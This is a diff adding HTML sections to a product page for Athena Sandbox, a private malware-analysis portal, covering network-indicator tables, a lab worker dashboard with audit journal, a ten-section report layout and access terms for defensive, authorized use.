+<section class="sec" id="c2" aria-labelledby="c2-title">
+  <div class="wrap sec__grid">
+    <div class="sec__copy">
+      <h2 id="c2-title">What the guest tried to reach</h2>
+      <p>Every dynamic run's saved network events become exact indicators: hosts and ports with their outcome, DNS names and resolvers, HTTP URLs, TLS server names. Each value searches the library for every other sample that carries it.</p>
+      <ul class="specs" role="list">
+        <li><strong>Exact by default.</strong> Indicators are shown and copied as exact values. Defanging is an explicit, remembered choice for pasting into mail or tickets.</li>
+        <li><strong>Cross-sample links.</strong> A shared network destination links samples deterministically, with no model in the loop.</li>
+        <li><strong>Honest gaps.</strong> When the guest network never answers, the report records a coverage gap, not a clean network section.</li>
+      </ul>
+    </div>
+    <div class="sec__fig">
+      <div class="panel">
+        <div class="panel__head"><span class="panel__title">Observed network indicators</span><span class="count">3</span><span class="scroll-cue" hidden>Scroll sideways<svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 8h11M9 4l4 4-4 4" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></span><button class="toggle" type="button" data-defang aria-pressed="false"><i class="switch" aria-hidden="true"><i></i></i>Defang</button></div>
+        <div class="table-wrap" tabindex="0" role="region" aria-label="Network indicators table, scrolls sideways">
+          <table class="table" style="--floor:600px">
+            <caption class="sr-only">Observed network indicators from the dynamic run</caption>
+            <thead><tr><th scope="col">Indicator</th><th scope="col">Kind</th><th scope="col">Outcome</th><th scope="col" class="num">Also in</th></tr></thead>
+            <tbody>
+              <tr><td class="mono" data-exact="updates.internal.test" data-defanged="updates[.]internal[.]test">updates.internal.test</td><td>DNS A query</td><td>answered by the local simulator</td><td class="num">3 samples</td></tr>
+              <tr><td class="mono" data-exact="http://updates.internal.test/bins/x86" data-defanged="hxxp://updates[.]internal[.]test/bins/x86">http://updates.internal.test/bins/x86</td><td>HTTP URL</td><td>200 from the local simulator</td><td class="num">3 samples</td></tr>
+              <tr><td class="mono" data-exact="203.0.113.14:6667" data-defanged="203.0.113[.]14:6667">203.0.113.14:6667</td><td>TCP connect</td><td class="wrap">refused; direct-IP callbacks are not simulated</td><td class="num">1 sample</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p class="panel__foot"><span class="pill" data-sev="medium">Coverage gap</span> <span>Direct-IP callbacks are not simulated, so the refused connection to <span class="mono">203.0.113.14:6667</span> is recorded as a gap in the report's network section.</span></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="lab" aria-labelledby="lab-title">
+  <div class="wrap sec__grid">
+    <div class="sec__copy">
+      <h2 id="lab-title">The lab, and its journal</h2>
+      <p>Lab is the screen that opens. It says which workers are admitting work, what each paused worker is holding, how many slots are leased and which family claims wait on a person. A paused analysis is counted as waiting everywhere, so the queue cannot call itself clear while work is owed.</p>
+      <ul class="specs" role="list">
+        <li><strong>Every switch asks why.</strong> Pausing or resuming a worker requires a reason, and the reason goes into the journal with the change.</li>
+        <li><strong>One journal for the lab.</strong> Who asked, why, what was expected and what the controller observed, newest first, filterable by action type, linked to the sample and analysis.</li>
+        <li><strong>Projects, roles, tokens.</strong> Admin, Viewer and Developer roles, one-time setup links, project-scoped service tokens and withdrawable egress grants.</li>
+        <li><strong>Health and alerts.</strong> Worker reachability and model availability on every screen; alerts to ntfy or a webhook.</li>
+      </ul>
+    </div>
+    <div class="sec__fig sec__fig--stack">
+      <div class="panel">
+        <div class="stat-grid">
+          <div class="stat"><span class="stat__label">Running</span><span class="stat__value">2</span><span class="stat__sub">1 AI research</span></div>
+          <div class="stat"><span class="stat__label">Queued</span><span class="stat__value">7</span><span class="stat__sub">7 stage jobs waiting</span></div>
+          <div class="stat"><span class="stat__label">Paused</span><span class="stat__value">0</span><span class="stat__sub">none owed</span></div>
+          <div class="stat"><span class="stat__label">Claims to review</span><span class="stat__value">3</span><span class="stat__sub">family proposals</span></div>
+        </div>
+        <div class="tbl-head" aria-hidden="true"><span class="tbl-head__title">Workers</span><span class="count">4</span><span class="tbl-head__aside">3 of 4 admitting, every change is journalled</span><span class="scroll-cue" hidden>Scroll sideways<svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 8h11M9 4l4 4-4 4" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></span></div>
+        <div class="table-wrap" tabindex="0" role="region" aria-label="Workers table, scrolls sideways">
+          <table class="table" style="--floor:640px">
+            <caption class="sr-only">Workers: 3 of 4 admitting, every change is journalled</caption>
+            <thead><tr><th scope="col">Worker</th><th scope="col">Stages</th><th scope="col">Admission</th><th scope="col" class="num">Waiting</th><th scope="col">Lease</th><th scope="col">Admit</th></tr></thead>
+            <tbody>
+              <tr><td class="mono">static-vm</td><td>Static</td><td><span class="badge" data-sev="clean">Admitting work</span></td><td class="num">3</td><td class="muted">idle</td><td><span class="switch is-on" role="img" aria-label="Admitting"><i></i></span></td></tr>
+              <tr><td class="mono">linux-x86_64</td><td>Dynamic</td><td><span class="badge" data-sev="clean">Admitting work</span></td><td class="num">2</td><td class="mono">a91f3c…</td><td><span class="switch is-on" role="img" aria-label="Admitting"><i></i></span></td></tr>
+              <tr data-sev="medium"><td class="mono">windows-vm</td><td>Dynamic</td><td><span class="badge" data-sev="medium">Admission paused</span></td><td class="num">2</td><td class="muted">idle</td><td><span class="switch" role="img" aria-label="Paused"><i></i></span></td></tr>
+              <tr><td class="mono">research-vm</td><td>AI research</td><td><span class="badge" data-sev="medium">Above AI limit</span></td><td class="num">0</td><td class="mono">5c07e2…</td><td><span class="switch is-on" role="img" aria-label="Admitting"><i></i></span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="tbl-head" aria-hidden="true"><span class="tbl-head__title">Audit journal</span><span class="count">18,342</span><span class="tbl-head__aside">who asked, why, and what the controller observed</span><span class="scroll-cue" hidden>Scroll sideways<svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 8h11M9 4l4 4-4 4" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></span></div>
+        <div class="table-wrap" tabindex="0" role="region" aria-label="Audit journal table, scrolls sideways">
+          <table class="table" style="--floor:720px">
+            <caption class="sr-only">Audit journal, 18,342 entries: who asked, why, and what the controller observed</caption>
+            <thead><tr><th scope="col" class="num">#</th><th scope="col">Action</th><th scope="col">Subject</th><th scope="col">Detail</th><th scope="col" class="num">When</th></tr></thead>
+            <tbody>
+              <tr data-sev="medium"><td class="num mono">18342</td><td><span class="badge" data-sev="medium">Worker admission changed</span></td><td class="muted">lab</td><td class="muted wrap">Worker: windows-vm. Enabled: false. Reason: host patching window.</td><td class="num">4m ago</td></tr>
+              <tr><td class="num mono">18341</td><td><span class="badge" data-sev="clean">Family claim reviewed</span></td><td class="mono">c7e21a0b…94f3d0</td><td class="muted wrap">Family: Mirai. Status: accepted. Source: intelligence stage.</td><td class="num">11m ago</td></tr>
+              <tr><td class="num mono">18340</td><td><span class="badge" data-sev="clean">Report created</span></td><td class="mono">3f9a2c1e…8d41c2</td><td class="muted wrap">Sections: 10. Revision: 2. Coverage notes: 2.</td><td class="num">12m ago</td></tr>
+              <tr><td class="num mono">18339</td><td><span class="badge" data-sev="clean">Stage completed</span></td><td class="mono">3f9a2c1e…8d41c2</td><td class="muted wrap">Stage: intelligence. Actions: 14 of 30. Exchanges: 9.</td><td class="num">13m ago</td></tr>
+              <tr><td class="num mono">18338</td><td><span class="badge" data-sev="none">Egress requested</span></td><td class="muted">lab</td><td class="muted wrap">Destination: 203.0.113.7:443. TTL: 15m. Policy digest: 9b1e4d…</td><td class="num">26m ago</td></tr>
+              <tr><td class="num mono">18337</td><td><span class="badge" data-sev="none">Sample submitted</span></td><td class="mono">3f9a2c1e…8d41c2</td><td class="muted wrap">Project: Botnet triage. Size: 68.2 KB. Handling: never executed by controller.</td><td class="num">31m ago</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="report" aria-labelledby="report-title">
+  <div class="wrap sec__grid">
+    <div class="sec__copy">
+      <h2 id="report-title">Ten sections, every time</h2>
+      <p>The report stage writes the same ten sections for every sample, in the same order, with a coverage note wherever a section has nothing it can establish. Absence is never inferred.</p>
+      <ul class="specs" role="list">
+        <li><strong>Immutable revisions.</strong> A new cycle writes a new report revision; the previous one stays, and the two can be compared section by section.</li>
+        <li><strong>Artifacts kept as they are.</strong> Screenshots render as images, telemetry as tables, binaries as hex. Raw bytes and the verified download are one control away.</li>
+        <li><strong>Exports.</strong> JSON exports carry evidence metadata and the readable report; original artifact bytes download separately.</li>
+      </ul>
+    </div>
+    <div class="sec__fig">
+      <div class="panel">
+        <div class="panel__head"><span class="panel__title">Report, revision 2</span><span class="panel__aside">10 sections, 2 coverage notes</span></div>
+        <ol class="toc">
+          <li><strong>Identification &amp; metadata</strong><span>hashes, format, architecture, size</span></li>
+          <li><strong>Unpacking &amp; container notes</strong><span>archive lineage and what was chosen to run</span></li>
+          <li><strong>Classification &amp; family</strong><span>verdict, claims and their review state</span></li>
+          <li><strong>Capability analysis</strong><span>capa matches, grouped and cited</span></li>
+          <li><strong>Network behavior &amp; C2</strong><span>observed indicators with outcomes</span></li>
+          <li><strong>Persistence &amp; defense evasion</strong><span>or a note that absence is not established</span></li>
+          <li><strong>Embedded configuration &amp; strings</strong><span>decoded strings and configuration</span></li>
+          <li><strong>MITRE ATT&amp;CK mapping</strong><span>techniques from cited findings only</span></li>
+          <li><strong>Threat actor, provenance &amp; linkage</strong><span>cross-sample links, or none claimed</span></li>
+          <li><strong>IOC summary</strong><span>exact values, defangable on request</span></li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec sec--access" id="access" aria-labelledby="access-title">
+  <div class="wrap access">
+    <div class="access__copy">
+      <h2 id="access-title">Private, by design</h2>
+      <p>Athena runs inside Team AER's lab and its repository is private. The portal at sandbox.brainfc.uk signs in existing accounts only; there is no public upload. If you do defensive malware analysis and want to compare notes, or run it in your own lab, write to us.</p>
+      <p class="access__fine">Use is limited to samples you are authorized to handle. Athena takes its workflow cues from ANY.RUN and does not claim parity with it. The live AI research cycle is still being proven under load.</p>
+    </div>
+    <div class="cta-row cta-row--access">
+      <a class="btn btn--primary" href="mailto:hello@aer.app?subject=Athena%20Sandbox%20access">Ask for access</a>
+      <a class="btn btn--quiet" href="https://sandbox.brainfc.uk">Sign in<small>(existing accounts only)</small></a>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="aer-footer">
+  <div class="wrap">
+    <div>
+      <h2>Athena Sandbox</h2>
+      <p>A local, auditable malware-analysis portal with an AI harness. Private repository, MIT licence, defensive and authorized analysis only.</p>
+      <ul role="list">
+        <li><a href="https://sandbox.brainfc.uk">Sign in (existing accounts only)</a></li>
+        <li><a href="mailto:hello@aer.app?subject=Athena%20Sandbox%20access">Ask for access</a></li>
+      </ul>
+    </div>
+    <div>
+      <h2>Team AER</h2>
+      <ul role="list">
+        <li><a href="/">aer.app</a></li>
+        <li><a href="/#projects">All apps</a></li>
+        <li><a href="https://github.com/Team-AER">GitHub organisation</a></li>
+      </ul>
+    </div>
+    <div>
+      <h2>Other apps</h2>
+      <ul role="list">
+        <li><a href="/avifors/">Avifors</a></li>
+        <li><a href="/omniocular/">Omniocular</a></li>
+        <li><a href="/accio/">Accio</a></li>
+        <li><a href="/hedwig/">Hedwig</a></li>
+      </ul>
+    </div>
+    <div class="aer-footer__meta">
+      <span>© 2026 Team AER. Athena Sandbox is MIT licensed. Defensive, authorized analysis only.</span>
+      <span>No cookies, no analytics, no accounts on this page.</span>
+    </div>
+  </div>
+</footer>
+
+<script src="/shared/shell.js" defer></script>
+<script src="/athena/page.js" defer></script>
+</body>
+</html>
